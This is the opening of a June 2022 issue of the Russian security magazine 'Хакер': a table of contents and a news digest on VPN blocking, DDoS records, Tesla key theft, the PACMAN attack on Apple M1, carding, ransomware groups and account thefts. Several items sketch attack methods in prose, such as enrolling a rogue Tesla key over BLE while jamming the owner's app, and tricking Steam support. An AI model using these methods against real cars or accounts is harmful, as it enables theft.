
                              ПОДПИСКА НА «ХАКЕР»




Мы благодарим всех, кто поддерживает
редакцию и помогает нам компенсировать
авторам и редакторам их труд. Без вас
«Хакер» не мог бы существовать, и каждый
новый подписчик делает его чуть лучше.




                        Напоминаем, что дает годовая подписка:

                            год доступа ко всем материалам, уже
                        опубликованным на Xakep.ru;
                            год доступа к новым статьям, которые
                         выходят по будням;
                         полное отсутствие рекламы на сайте
                           (при условии, что ты залогинишься);
                         возможность скачивать выходящие
                       каждый месяц номера в PDF, чтобы
                           читать на любом удобном устройстве;
                       личную скидку 20%, которую
                      можно использовать для продления
                          годовой подписки. Скидка накапливается
                               с каждым продлением.

                         Если по каким-то причинам у тебя еще нет
                           подписки или она скоро кончится,
                              спеши исправить это!
                                               Июнь 2022
            № 279
CONTENTS

    MEGANews
  Самые важные события в мире инфосека за июнь

    Флуктуация шелл-кода
  Пишем инжектор для динамического шифрования полезной нагрузки в памяти

    Denonia
  Как работает первый вредонос, нацеленный на AWS Lambda

    Oh, Follina!
  Изучаем нашумевшую уязвимость в Microsoft Ofce

    Уроки форензики
  Расследуем киберинцидент MrRobot

    Фундаментальные основы хакерства
  Разбираем самодеятельность компиляторов при трансляции оператора выбора

    Фундаментальные основы хакерства
  Определяем циклы в двоичном коде программы

    Полное G
  Ломаем приложение на языке G, созданное в LabVIEW

    HTB Meta
  Эксплуатируем уязвимости в обработчиках изображений

    HTB Timing
  Пентестим веб-сервер на PHP

    HTB Paper
  Пентестим WordPress и эксплуатируем баг в Polkit

    HTB Phoenix
  Ломаем сайт на WordPress в обход WAF

    Неприступный VPS
  Строим защищенный канал с внешним миром

    Неспящий iPhone
  Как выключенный iPhone может шпионить за своим владельцем

    Приходи на сеновал!
  Как устроен Ceno — мобильный браузер для обхода цензуры

    Используй силу, Тукс!
  Применяем PowerShell в Linux

    Roxy-WI
  Удобный интерфейс для HAProxy, Nginx, Apache и Keepalived

    Часы для гика 2.0
  Проектируем и собираем настольные бинарные часы с Bluetooth

    Время паять!
  Подбираем инструменты и осваиваем искусство пайки

    Титры
  Кто делает этот журнал
                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru


В этом месяце: в России блокируют, но не запрещают
использовать VPN, инженер Google считает, что чат‑бот ком‐
пании обрел сознание, исследователь показал, как угнать
Tesla за 130 секунд, японские компании с трудом пережи‐
вают отказ от Internet Explorer, процессорам Apple M1 угро‐
жает  проблема PACMAN,  а  также  другие  интересные
события.





VPN БЛОКИРУЮТ,
НО НЕ ЗАПРЕЩАЮТ
В начале июня у российских пользователей возникли проблемы с NordVPN,
Proton VPN и другими VPN-сервисами. Представители Роскомнадзора под‐
твердили, что в рамках закона «о суверенном рунете» ведется работа по бло‐
кировке VPN-сервисов, в том числе Proton VPN, помогающих обходить бло‐
кировки признанного в РФ запрещенным контента.
   После жалоб на проблемы с подключением на сайте Proton VPN появилось
официальное сообщение, в котором операторы предположили, что начались
блокировки.

      «В  настоящее  время мы  изучаем  проблему,  и  она  не  связана
      с какими‑либо изменениями с нашей стороны. Вероятно, местные«
      интернет‑провайдеры и власти мешают работе VPN-соединений, и в
      этом случае мы не сможем решить эти проблемы. Некоторые серверы
      могут продолжать работать. Мы будем продолжать попытки обойти
       блокировку. Спасибо за ваше терпение и понимание», — писали пред-
        ставители сервиса.                »
Вскоре после этого СМИ сообщили, что, согласно постам пользователей
в социальных сетях, похожие проблемы наблюдаются у Lantern и Outline VPN,
а также сбоит NordVPN. Сервис GlobalCheck показывал, что сайт nordvpn.com
недоступен в сетях «Ростелекома», МТС, «Мегафона», Tele2, билайна и Yota.
   Специалисты «Роскомсвободы» подтверждали, что блокировки действи‐
тельно имеют место:

       «Почти  все  серверы  швейцарского  VPN-сервиса  от  создателей
       ProtonMail  недоступны в  России  у  провайдеров с  оборудованием«
      ТСПУ. Блокировке подвергается API-хост api.protonvpn.ch, из‑за чего
      программа не может скачать список серверов для подключения, а так-
     же большинство публичных серверов в бесплатной версии  услуги.
     На момент написания этого сообщения работает сервер JP-FREE#9.


       Фильтрация осуществляется по IP-адресам серверов, а не по харак-
      терным признакам VPN-протоколов, хоть и необычно: UDP-запросы
       остаются без ответа, а TCP-соединение устанавливается, но „зависа-
       ет“ после первого отправленного пакета».                »
Вскоре появилось и официальное заявление от представителей Роскомнад‐
зора, которые сообщили, что в рамках закона «о суверенном рунете» в Рос‐
сии ведется работа по блокировке VPN-сервисов.

       «Согласно закону „О связи“, средства обхода блокировок противоп-
       равного контента признаются угрозой. Центр мониторинга и управле-«
      ния сетью связи общего пользования (ЦМУ ССОП) принимает меры
      по ограничению работы на территории России VPN-сервисов, наруша-
     ющих  российское  законодательство», —  заявили  в  пресс‑службе
       ведомства.                »
Интересно, что спустя около двух недель после этого глава Минцифры Мак‐
сут Шадаев сообщил, что власти не намерены вводить наказание для тех, кто
пользуется VPN-сервисами, чтобы обходить блокировки. При этом он отме‐
тил, что использование таких приложений все же не приветствуется.


      «Никаких наказаний для пользователей [VPN] категорически не будет
        вводиться. Мы против этого. Поэтому, кому очень надо, такую воз-«
      можность будет иметь, и будет иметь ее дальше, и сохранит. Но,
       конечно, политике государства, когда в принципе ограничивают дос-
       туп к каким‑то ресурсам, это противоречит. Я считаю, это разумный
       компромисс».                »
Также Шадаев поделился статистикой пользовательского трафика, которую
специалисты Минцифры собирали до начала «спецоперации» и после. По его
словам, до 24 февраля суммарно на три заблокированные теперь социаль‐
ные сети — Facebook, Instagram (принадлежат корпорации Meta, которая
признана экстремистской и запрещена в РФ) и Twitter — приходилось 10–
12% от всего трафика. Однако после 24 февраля и блокировки на долю сер‐
висов VPN, которые помогали  обойти  ограничения,  стало  приходиться
лишь 20% от прежнего трафика трех соцсетей.


      «То есть 80% просто... неудобно переключаться, включать, выключать
       [VPN], — пояснил Шадаев. — Потом, многие сайты, российские, ата-«
       кованные из‑за рубежа, дают доступ только по российскому IP. И в
      этом смысле, даже если вы сидите под VPN, хотите зайти на россий-
      ский сайт, вам говорят, что он недоступен. Вам надо VPN выключить,
       зайти на сайт, потом включить».                »

26 000 000 ЗАПРОСОВ В СЕКУНДУ

Специалистам Cloudflare удалось отразить новую рекордную DDoS-атаку, в которой участвовал
небольшой, но мощный ботнет, состоящий из 5067 устройств. По информации Cloudflare,
пиковая мощность атаки составила 26 миллионов запросов в секунду (request-per-second,
RPS) и она была нацелена на одного из клиентов компании, использующих бесплатный тариф‐
ный план.





Суммарно в атаке были задействованы 5067 устройств, каждое из которых могло генерировать
примерно 5200 запросов в секунду. Интересно, что этот небольшой ботнет, использовавший
виртуальные машины и серверы, оказался в 4000 раз мощнее куда более крупных ботнетов.





ЯПОНЦАМ СЛОЖНО
БЕЗ IE
15 июня 2022 года Microsoft окончательно «похоронила» Internet Explorer,
отказавшись от использования устаревшего браузера. Невзирая на то что
к этому шагу в компании готовились давно и предупреждали пользователей,
прекращение поддержки IE спровоцировало настоящий хаос в Японии, где IE
по‑прежнему был в ходу у многих компаний и госструктур.
   Нужно сказать, что разработчики Microsoft давно реализуют постепенный
отказ от поддержки Internet Explorer, чья доля рынка составляет около 5%,
и  стараются  перевести  пользователей  на  браузер  Edge. К  примеру,
еще в 2020 году Microsoft включила принудительное перенаправление IE-to-
Edge для всех пользователей.
  С этого момента более 1000 различных сайтов вообще перестали откры‐
ваться в IE, и в их число вошли Twitter, Facebook и Instagram (заблокированы
в России, принадлежат компании Meta, признанной экстремистской орга‐
низацией, запрещенной на территории РФ), VK, Google Drive, Microsoft Teams,
ESPN, Stack Overflow, Yahoo Mail. Посетители таких ресурсов автоматически
перенаправлялись в Edge.
   15 июня 2022 года, как и планировалось, Internet Explorer 11 был лик‐
видирован в клиентских сборках Windows 10 20H2 и более поздних, а также
в Windows IoT 20H2 и более поздних. В Windows 11 устаревший браузер вооб‐
ще отсутствует, так как в новой версии ОС браузером по умолчанию является
Edge.
   Теперь десктопная версия IE будет перенаправлять пользователей в Edge
в течение нескольких месяцев, а потом от браузера избавятся окончательно.
  При этом есть продукты, на которые ликвидация IE не распространяется:
режим IE Mode в Edge, десктопный IE 11 в Windows 8.1 и Windows 7 (Extended
Security Updates), Windows Server LTSC (все версии), Windows Server 2022,
клиент Windows 10 LTSC (все версии), Windows 10 IoT LTSC (все версии).
При этом режим IE в Microsoft Edge будет поддерживаться по меньшей мере
до 2029 года, что даст разработчикам долгих восемь лет на модернизацию
устаревших приложений.
    Хотя подготовка к 15 июня велась уже давно, издание Nikkei сообщило, что
«смерть» IE стала неприятным сюрпризом для множества японских компаний,
спровоцировав настоящий хаос.
  По данным журналистов, начиная с апреля текущего года, токийского раз‐
работчика ПО Computer Engineering & Consulting заваливали просьбами
о помощи. Проблема заключается в том, что клиенты, а это в основном
государственные учреждения, финансовые учреждения, а также производс‐
твенные и логистические компании, управляли сайтами, совместимыми толь‐
ко с Internet Explorer.


      «Они знали [о поэтапном отказе] давно, но, видимо, откладывали при-
      нятие мер», — рассказывает представитель компании.«                »
О похожих проблемах свидетельствовал и мартовский опрос, проведенный
ИТ‑компанией Keyman’s Net, который показал, что множество организаций
в Японии до сих пор используют Internet Explorer. При этом 49% респондентов
заявили, что браузер им нужен для работы.
  По   словам   опрошенных,   браузер,  в   частности,   использовался
для управления посещаемостью сотрудников, расчета расходов и ряда дру‐
гих  внутренних  инструментов. В некоторых  случаях  у компаний  просто
не было другого выбора, поскольку на IE оказались завязаны системы кли‐
ентов, необходимые для обработки заказов.
   Хуже того, более 20% респондентов признали, что они вообще не знали
или не поняли, как перейти на другие браузеры после прекращения поддер‐
жки Internet Explorer.
  СМИ писали, что особенно медленно на отказ от IE реагировали японские
госорганы. К примеру, сайт, на котором размещается информация о гос‐
закупках и торгах, только после 15 июня стал рекомендовать пользователям
не Internet Explorer, а браузеры Microsoft Edge и Google Chrome. Для работы
с сайтом пенсионной службы Японии и онлайн‑заявлениями до сих пор нужно
просматривать сайт в IE-режиме в Edge. А на многих других государственных
ресурсах  Internet Explorer по‑прежнему указан в качестве единственного
рекомендуемого браузера.

      «Японцы любят безопасность. Чем  крупнее  организация или пра-
       вительственное учреждение, тем дольше они колеблются [перед при-«
       нятием решения], — комментировал Тецутаро Уэхара, профессор Ази-
       атско‑Тихоокеанского  университета Рицумэйкан. — Самая большая
      проблема заключается в том, что, когда речь идет о правительствен-
      ных сайтах, существует очень ограниченное количество поставщиков,
      которые могут вводить в работу столь большие системы».                »

APPLE ОПУБЛИКОВАЛА СТАТИСТИКУ БАНОВ
Компания Apple  опубликовала  ежегодный отчет о работе команд  экспертов App Review
и Discovery Fraud, которые отвечают за анализ приложений, попадающих (или не попадающих)
в App Store, а также борьбу с мошенниками.

Инженеры компании говорят, что за год они защитили пользователей от 1 600 000 опасных
и ненадежных приложений и обновлений.





УГНАТЬ TESLA
ЗА 130 СЕКУНД
Австрийский исследователь Мартин Херфурт (Martin Herfurt) продемонстри‐
ровал новый способ угона Tesla. Оказалось, для этого можно злоупотребить
функцией добавления новой NFC-ключ‑карты и проделать это незаметно
для владельца авто, всего за 130 секунд.
   Корень проблемы заключается в том, что в прошлом году Tesla выпустила
обновление, которое упростило запуск автомобилей после разблокировки
NFC-ключ‑картами. Раньше  водители, которые использовали  ключ‑карту
для разблокировки своих авто, должны были поместить ее на центральную
консоль, чтобы начать движение. Но после обновления, вышедшего в августе
прошлого года, владельцы Tesla получили возможность управлять своими
автомобилями сразу после разблокировки с помощью ключ‑карты, которая
является одним из трех основных способов разблокировки авто (два других
способа — это брелок и мобильное приложение).





Херфурт обнаружил, что у новой функции есть странная особенность: она
не    только    позволяет    автомобилю    автоматически    заводиться
в течение 130 секунд после разблокировки, но и переводит его в состояние,
позволяющее принимать новые ключи, без необходимости аутентификации
и без какой‑либо индикации на дисплее авто.

       «Tesla  ввела этот таймер, чтобы сделать использование NFC-карт
      более  удобным. То  есть  автомобиль  должен  заводиться и  ехать«
      без повторного использования ключ‑карты пользователем. Но есть
       проблема: в течение 130-секундного периода разрешается не только
      вождение автомобиля, но и [регистрация] нового ключа», — объясняет
       эксперт.                »
Конечно, официальное приложение Tesla не позволяет регистрировать новые
ключи, если оно не подключено к учетной записи владельца, однако Херфурт
обнаружил, что автомобиль охотно обменивается сообщениями с любым
другим устройством Bluetooth Low Energy (BLE), находящимся поблизости.
В итоге эксперт создал собственное приложение под названием Teslakee,
которое использует VCSec, как и официальное приложение Tesla.
   Teslakee демонстрирует, с какой легкостью воры могут добавить авто‐
мобилю собственный ключ. Нужно просто находиться неподалеку от авто
во время 130-секундного окна после разблокировки NFC-ключ‑картой. После
этого вор может использовать свой ключ, чтобы открыть, завести и заглушить
автомобиль в любое время. Ни на дисплее авто, ни в настоящем приложении
Tesla при этом не будет отображаться никаких сообщений о случившемся.
   Если же владелец транспортного средства использует для разблокировки
авто приложение (а это самый распространенный метод разблокировки
Tesla), злоумышленник может вынудить жертву использовать  ключ‑карту.
Для этого достаточно принести с собой глушилку и заблокировать частоту
BLE, необходимую для работы приложения.
   Херфурт успешно испробовал свою атаку на Tesla Model 3 и Y. Он не про‐
верял данный метод на новых Model S и X, но предполагает, что они тоже уяз‐
вимы, так как используют те же технологии.
   Нужно отметить, что Херфурт создал Teslakee и провел свое исследование
в рамках Project Tempa, который «предоставляет инструменты и информацию
о  протоколе VCSec, используемом  аксессуарами и приложением  Tesla
для управления транспортными средствами через Bluetooth LE». Также Хер‐
фурт является членом Trifinite Group, исследовательского и хакерского кол‐
лектива, занимающегося проблемами BLE.
   Исследователь обнародовал данные о проблеме, так как, по его словам,
Tesla вряд ли ее исправит. Херфурт пишет, что он так и не получил от ком‐
пании никаких ответов по поводу других уязвимостей, которые обнаружил
в 2019 и 2021 годах, и сомневается, что теперь что‑то изменится.


      «У меня сложилось впечатление, что они уже обо всем знали и не
      хотели что‑либо менять, — говорит Херфурт. — На этот раз Tesla«
       [тоже] не может не знать об этой скверной имплементации. Поэтому я
       просто не вижу смысла связываться с Tesla заранее».                »

МОШЕННИЧЕСКИЕ КОЛ-ЦЕНТРЫ В КОЛОНИЯХ ЗАКРЫТЫ
В кулуарах конференции «Цифровая индустрия промышленной России» заместитель правления
«Сбербанка» Станислав Кузнецов рассказал журналистам, что проблема с мошенническими
кол‑центрами в российских колониях на сегодня решена. По его словам, еще три‑четыре года
назад с территории колоний работало «очень большое количество кол‑центров», но теперь все
изменилось.





         «Наши  эксперты в свое  время  вскрыли  проблему, что очень большое→        количество кол‑центров работало с территории российских колоний. В свое
        время мы давали статистику (это статистика трех‑четырехлетней давности), что
        около 40% — это с территории Украины, около 40% — с территории колоний,
      тюрем, около 20% — с территории других точек, сопредельных стран или с тер‐
       ритории России.
           Сейчас мы видим только единичные какие‑то факты, когда на наших сис‐
       темах мониторинга мы видим трансакции, которые проходят как мошеннические
       из тюрем либо из колоний. Мы считаем, что проблема кол‑центров в российских
        колониях решена, и решена прежде всего руководством ФСИН»,


— заявил Кузнецов.





                                     Продолжение статьи →
← Начало статьи
 PACMAN ПРОТИВ
 APPLE M1
   Специалисты Массачусетского технологического института обнаружили, что
  чипы Apple M1 уязвимы перед спекулятивной атакой PACMAN. Эта проблема
  носит аппаратный характер и связана с аутентификацией указателя (pointer
   authentication),  позволяя  злоумышленнику  выполнить  произвольный  код
  на уязвимом устройстве.
      Pointer authentication — защитная функция, добавляющая к указателям
   криптографическую подпись, называемую pointer authentication code (PAC).
   Благодаря ей операционная система обнаруживает и блокирует неожидан‐
  ные изменения, которые в противном случае могли бы привести к утечке дан‐
  ных или компрометации. Атака PACMAN позволяет удаленно обойти аутен‐
   тификацию указателя в ядре из userspace, по сути давая атакующему полный
   контроль над чужой машиной.
     Для реализации атаки злоумышленникам сначала понадобится найти баг
   в памяти, связанный с ПО на устройстве жертвы. Необходимо, чтобы эта
   ошибка была заблокирована PAC, то есть имела возможность перерасти
   в более серьезную проблему.

       «PACMAN использует существующие программные ошибки (чтение/
         запись памяти) и превращает их в более серьезный примитив эксплу- «
          атации  (обход  pointer  authentication),  который  может  привести
          к выполнению произвольного кода. Чтобы проделать это, нам нужно
         узнать значение PAC для конкретного указателя жертвы, — расска-
         зывают эксперты. — PACMAN добивается этого с помощью того, что
       мы называем PAC Oracle. Это способность определять, соответствует
        ли данный PAC конкретному указателю. PAC Oracle не должен сбоить
        даже в случае неверных предположений, и с его помощью мы брут-
        форсим все возможные значения PAC».                 »
   Эксперты тестировали PACMAN только на Apple M1, но полагают, что проб‐
  лема может затрагивать и другие процессоры ARM. Также отмечается, что
   атака представляет опасность для всех процессоров, использующих pointer
   authentication.
       Хотя компания Apple не может исправить аппаратный баг и блокировать
   атаки PACMAN, по словам экспертов, пользователям вряд ли стоит беспоко‐
   иться, если они поддерживают свое ПО в актуальном состоянии и оно
  не содержит ошибок, которые могут быть использованы PACMAN.


       «PACMAN — это метод эксплуатации, сам по себе он не может угро-
         жать вашей  системе. Хотя  аппаратные  механизмы, используемые «
        PACMAN, не могут быть исправлены программно, можно исправить
          ошибки,   связанные   с   нарушением   целостности  информации
         в памяти», — добавляют специалисты.                 »
   Исследователи уведомили Apple о своих выводах еще в 2021 году, а также
   поделились PoC-эксплоитом. Однако в Apple заявили, что новая side-channel-
   атака не представляет опасности для пользователей Mac, так как сама
  по себе не может привести к обходу защиты устройства, а для ее эксплуата‐
  ции нужны другие уязвимости в системе.


  БОЛЕЕ 50 РОССИЙСКИХ КОМПАНИЙ ДОПУСТИЛИ УТЕЧКИ

    Аналитики Group-IB подсчитали, что в мае и в начале июня в даркнете было опубликовано
   рекордное количество баз данных российских компаний — более 50.

   Для сравнения: в апреле их было 32, а в марте — всего 16. Среди пострадавших были ком‐
   пании, относящиеся к интернет‑сервисам доставки, медицине, телекому, интернет‑ретейлу,
   онлайн‑образованию, строительству.

   Общее количество строк в 19 наиболее крупных утечках последних полутора месяцев сос‐
   тавило 616,6 миллиона.

    Практически все базы включают имена клиентов, их телефоны, адреса, даты рож-
   дения, а некоторые также содержат хеш‑пароли, паспортные данные, подробности
  заказов или результаты медицинских анализов.





 ШИРОКИЕ ЖЕСТЫ
 КАРДЕРОВ
   Операторы нового кардерского сайта BidenCash пытаются получить извес‐
   тность, публикуя данные кредитных карт и информацию об их владельцах бес‐
   платно или почти бесплатно.
     Новый ресурс появился в апреле 2022 года, но долгое время не был готов
   к проведению масштабных операций. Теперь же  операторы BidenCash
  решили бесплатно раздать всем желающим CSV-файл, содержащий имена,
   адреса, номера телефонов, адреса электронной почты и номера банковских
   карт, и таким образом прорекламировать свою платформу.
    В общей сложности файл содержит около восьми миллионов строк, но не
  все из них — данные карт. По оценке экспертов из компании D3Lab, в этом
   дампе можно найти данные о 6600 банковских картах и около 1300 из них —
   это новые и действительные карты, большинство из которых выпущены VISA
  и принадлежат физическим лицам из США.
     Кроме того, аналитики пишут, что в дампе можно обнаружить более трех
   миллионов уникальных адресов электронной почты, которые могут исполь‐
   зоваться злоумышленниками для фишинга и захвата чужих учетных записей.
     Как и на других подобных сайтах, на BidenCash публикуется рейтинг
   валидности для новых лотов, такая оценка выставляется после оценки случай‐
  ной выборки из 20 карт. Каждую неделю проводятся новые проверки всех
   листингов, и, если полученный рейтинг сильно отличается от прошлой оцен‐
   ки, продажу закрывают.
      Также на BidenCash работает система фильтрации, позволяющая зло‐
   умышленникам находить украденные карты, подходящие именно для их кам‐
   паний. Можно искать по конкретным параметрам: странам, банкам или только
   записи, в которых есть необходимые данные, такие как CVV, адрес электрон‐
  ной почты, физический адрес, тип карты и имя владельца. Проведенный
   исследователями тест показал, что хакеры могут покупать данные о под‐
  ходящих им картах всего по 15 центов за штуку.





   Стоит отметить, что слив данных о картах в открытый доступ ради рекламы
   вовсе не новый способ продвижения для кардерских ресурсов. К примеру,
   в прошлом году операторы подпольного маркетплейса All World Cards про‐
  вели похожую «рекламную акцию» и опубликовали на хакерских форумах дан‐
  ные миллиона банковских карт, украденные в период с 2018 по 2019 год.


  УГРОЗЫ ПЕРВОГО КВАРТАЛА

    Эксперты Positive Technologies обнародовали отчет об актуальных кибератаках первого квар‐
   тала 2022 года. По их словам, общее количество атак выросло на 14,8% (по сравнению с чет‐
   вертым кварталом 2021 года), а одними из наиболее заметных угроз стали вайперы, унич‐
   тожающие чужие данные.





                               Общее количество атак в 2021 и 2022 годах

   Чаще всего атакам подвергались государственные и медицинские учреждения, а также
   организации сферы промышленности. Также заметны изменения в пятерке самых ата‐
   куемых отраслей: теперь в этот топ попали СМИ. Доля атак, направленных на эту отрасль, сос‐
   тавила 5%.





    Количество атак, направленных на госучреждения, увеличилось практически в 2 раза (по срав‐
   нению с данными четвертого квартала 2021 года).


    Также заметили всплеск атак на веб‑ресурсы различных государственных учреждений: их доля
   выросла до 22% (по сравнению с 13% в предыдущем квартале).

   Действия злоумышленников были преимущественно направлены на кражу конфиденциальной
   информации: в первую очередь персональные данные (34%), а также сведения, составляющие
   коммерческую тайну  (19%). Пользовались популярностью медицинская информация  (15%)
   и учетные данные (12%).





  В атаках на частных лиц в основном воровали учетные данные (46%), а также персональные
   данные (19%) и данные платежных карт (21%).





 ADOBE ACROBAT
 БЛОКИРУЕТ
 АНТИВИРУСЫ
   ИБ‑эксперты заметили, что Adobe Acrobat пытается не дать антивирусам изу‐
   чать открываемые пользователями PDF-файлы, тем самым создавая угрозу
   безопасности. Сообщается, что Adobe Acrobat проверяет, интересуются ли
  его процессами компоненты примерно 30 защитных продуктов, а затем бло‐
   кирует  их,  фактически  лишая  возможности  отслеживать  вредоносную
   активность.
      Аналитики Minerva Labs объясняют, что обычно для работы защитных
  решений нужна «видимость» всех процессов в системе. Как правило, это дос‐
   тигается путем внедрения DLL в софт, запускаемый на машине пользователя.
  С марта 2022 года эксперты наблюдают постепенный рост активности про‐
   цессов Adobe Acrobat Reader, которые пытаются узнать, какие библиотеки
   DLL, связанные с защитными продуктами, загружены (через получение дес‐
   криптора DLL).
      Согласно отчету, в настоящее время Adobe ищет около 30 библиотек DLL,
   в том  числе  связанных с  антивирусами  Bitdefender,  Avast, Trend  Micro,
  Symantec, Malwarebytes, ESET, Kaspersky, F-Secure, Sophos, Emsisoft.
     Запросы  к  системе  выполняются  с помощью Chromium Embedded
  Framework (CEF) библиотеки libcef.dll, используемой широким спектром прог‐
  рамм. Исследователи пишут, что «libcef.dll загружается двумя процессами
  Adobe: AcroCEF.exe и RdrCEF.exe», то есть оба продукта проверяют систему
  на наличие компонентов одних и тех же защитных решений.
      Изучив, что происходит с DLL, внедренными в процессы Adobe, аналитики
   Minerva Labs обнаружили, что Adobe проверяет, установлено ли значение
   bBlockDllInjection    в    разделе    реестра    SOFTWARE\Adobe\Adobe
   Acrobat\DC\DLLInjection\ на 1. Если ответ положительный, это предотвращает
   инъекции DLL антивирусного ПО.
      Отмечается, что, судя по сообщениям на форумах Citrix, еще весной поль‐
   зователи жаловались на ошибки Sophos AV, который работал некорректно
   из‑за продукции Adobe. Пострадавшие писали, что в компании им пред‐
  ложили «отключить внедрение DLL для Acrobat и Reader».
      Представители Adobe подтверждают, что пользователи действительно
   жалуются на «проблемы со стабильностью», которые возникают из‑за того,
   что DLL-компоненты некоторых защитных продуктов несовместимы с исполь‐
  зуемой Adobe Acrobat библиотекой CEF. В компании говорят, что в настоящее
   время работают над проблемой вместе с поставщиками защитных решений.
    В свою очередь, исследователи Minerva Labs пишут, что Adobe выбрала
   способ, который решает проблемы совместимости, однако создает угрозу
   безопасности и повышает риски атак, не позволяя антивирусам должным
   образом защитить систему.


 МОШЕННИЧЕСТВО УМНОЖИЛОСЬ НА ТРИ

    Аналитики BI.ZONE сообщили, что за первый квартал 2022 года компания заблокировала
   в общей сложности 16 311 вредоносных ресурсов (в январе — 9048, в феврале — 4488, в мар‐
   те — 2211), а это в 3 раза больше, чем за аналогичный период 2021 года.

   Спад количества мошеннических доменов в марте эксперты связывают с обострением внеш‐
   неполитической ситуации, из‑за которой мошенники сфокусировались на других типах атак,
   например на DDoS-атаках.  Однако  отчет  гласит,  что фишинг  по‑прежнему  остается
   популярным вектором атак на различные организации.





 EVIL CORP И LOCKBIT
   Группировка Evil Corp перешла на использование шифровальщика LockBit,
   чтобы избежать  санкций, наложенных ранее Управлением по  контролю
  за иностранными активами Министерства финансов США (OFAC).
      Напомню, что группировка Evil Corp существует как минимум с 2007 года,
  но раньше хакеры чаще выступали в роли партнеров для других группировок.
  Лишь со временем Evil Corp стала концентрироваться на собственных атаках,
   создав известный банковский троян Dridex. Когда атаки программ‑вымога‐
  телей начали приносить больше прибыли, Evil Corp запустила и собственный
   вымогатель BitPaymer, доставляя его на машины жертв посредством Dridex.
   Последний постепенно эволюционировал из обычного банкера в сложный
  и многофункциональный инструмент.
     Все это привело к тому, что в 2019 году власти США предъявили обви‐
  нения двум россиянам, которые, по информации правоохранителей, стояли
  за разработкой малвари Dridex и другими вредоносными операциями. Также
   власти США ввели санкции в отношении 24 организаций и лиц, связанных
  с Evil Corp и упомянутыми подозреваемыми. В результате компании‑перего‐
   ворщики, которые обычно договариваются с вымогателями об уплате выкупа
  и расшифровке данных, отказались «работать» с Evil Corp, чтобы избежать
  штрафов и судебных исков со стороны Министерства финансов США.
  А самим пострадавшим стало куда сложнее заплатить выкуп.
      После этого, в июне 2020 года, Evil Corp переключилась на использование
   малвари WastedLocker, в 2021 году появился шифровальщик Hades (64-бит‐
  ный вариант WastedLocker, обновленный дополнительной обфускацией кода
  и рядом функций), а затем группа провела уже несколько «ребрендингов»
  и выдавала себя за группировку PayloadBin и использовала другие вымога‐
   тели: Macaw и Phoenix.





   Теперь аналитики ИБ‑компании Mandiant заметили, что преступники пред‐
   приняли новую попытку дистанцироваться от известных экспертам хакерских
   инструментов, чтобы их жертвы могли платить выкупы, не нарушая правила
  OFAC.
      Кластер активности, который Mandiant отслеживает как UNC2165, ранее
   развертывавший шифровальщик Hades и связанный с Evil Corp, теперь выс‐
   тупает «партнером» разработчиков вымогателя LockBit.


         «Использование этого RaaS позволяет UNC2165 сливаться с другими
         аффилиатами LockBit. [Теперь] для установления правильной атри- «
        буции нужно наблюдение за более ранними этапами атак, по срав-
        нению с их предыдущими операциями, которые можно было связать
         с    [Evil   Corp]   благодаря   использованию   эксклюзивных   прог-
         рамм‑вымогателей, — говорят исследователи. — Кроме того, частые
         обновления кода и ребрендинги HADES требовали ресурсов для раз-
          работки, и вполне вероятно, что в UNC2165 полагают, что исполь-
         зование LockBit — это более экономичный выбор».                 »
   Предполагается, что новая  тактика  позволит хакерам  потратить  время,
   сэкономленное на разработке собственной малвари, на расширение опе‐
   раций. Также эксперты высказывают и другую теорию: вероятно, переход
  на чужие вредоносные инструменты поможет Evil Corp освободить достаточ‐
  ное количество собственных ресурсов для разработки нового вымогателя
  с нуля, что впоследствии может серьезно затруднить отслеживание новых
   операций хак‑группы.


  АТАКА НА RUTUBE
    Эксперты Positive Technologies, занимающиеся расследованием атаки на RuTube, произошед‐
   шей в мае 2022 года, рассказали, что инцидент был целевой атакой, «нацеленной на нанесение
   максимального и долговременного урона сервису». Также выяснилось, что сам взлом произо‐
   шел еще в начале весны.
        Глава Positive Technologies Денис Баранов сообщил, что атака была тщательно спланиро‐
   вана, а сам взлом RuTube произошел еще в марте 2022 года, то есть два месяца хакеры оста‐
   вались в сети компании и готовились к активной фазе.





             «Это была именно целевая хакерская атака, нацеленная на нанесение мак‐ →           симального и долговременного урона сервису. Однако они умудрились зас‐
            ветиться на антивирусах, использовали инструментарий, который характерен
          для базового пентестера. Хакеры изучили инфраструктуру, выделили виртуаль‐
         ные машины, задействованные в обеспечении работы сервиса, и пытались уда‐
           лять именно их. И тут началась гонка: ИТ‑специалисты RuTube заметили воздей‐
          ствие на ряд элементов инфраструктуры и сразу же стали их отключать и изо‐
           лировать,  стараясь  опередить  хакеров,  удалявших  виртуальные машины.
          Айтишники компании все‑таки победили за счет скорости реакции»,


  — рассказал Баранов на XXV Петербургском международном экономическом форуме (ПМЭФ)
   в рамках сессии «Информационная борьба: защита национального медийного суверенитета».





                                        Продолжение статьи →
← Начало статьи
 СКИНЫ ЗА ДВА
 МИЛЛИОНА
 ДОЛЛАРОВ
   Стример ohnePixel рассказал о громкой краже, в ходе которой хакер похитил
   у игрока Counter-Strike: Global Offensive редкие предметы, а общая стоимость
   инвентаря пострадавшего оценивается примерно в два миллиона долларов
  США.
      OhnePixel пишет, что кража произошла в середине июня. По его данным,
   email и пароль от учетной записи были изменены за неделю до этого, но жер‐
   тва не заметила, как это произошло.
      Получив контроль над учетной записью коллекционера, хакер начал про‐
   давать редкие и ценные предметы, а часть оставил «на потом», передав их
   другому аккаунту. По информации ohnePixel, среди прочего у пострадавшего
   в инвентаре были  редчайший нож керамбит без  звезды,  появившийся
   в результате бага, семь сувенирных AWP Dragon Lore, а также вариация
   керамбита #1 blue gem поверхностной закалки, и только эти предметы оце‐
   ниваются примерно в 1,4 миллиона долларов США.
    При этом сообщается, что некоторые пользователи, купившие украденные
   скины, обнаружили, что покупки уже исчезли из их инвентаря. То есть Valve,
  похоже, откатывает совершенные с украденными предметами сделки и раз‐
   бирается в ситуации. Впрочем, официальных комментариев от компании
  не поступало.
      Поскольку технические подробности этой атаки неизвестны, в коммента‐
  риях к посту ohnePixel в Twitter пользователи строят самые разные теории
  о том, как злоумышленник мог обойти двухфакторную аутентификацию. Мно‐
   гие отмечают, что ради столь дорогих предметов злоумышленник мог провес‐
   ти атаку подмены SIM-карты. Другие пользователи пишут, что существуют
  иные способы. К примеру, зная username человека в Steam, хакер мог отпра‐
   вить на этот аккаунт деньги, а затем обратиться в поддержку и заявить, что
   этот аккаунт принадлежит ему. То есть, когда поддержка Steam запросит
   доказательства proof of ownership, этого небольшого платежа может оказать‐
  ся достаточно.


 ДОСТУПЫ НА ПРОДАЖУ
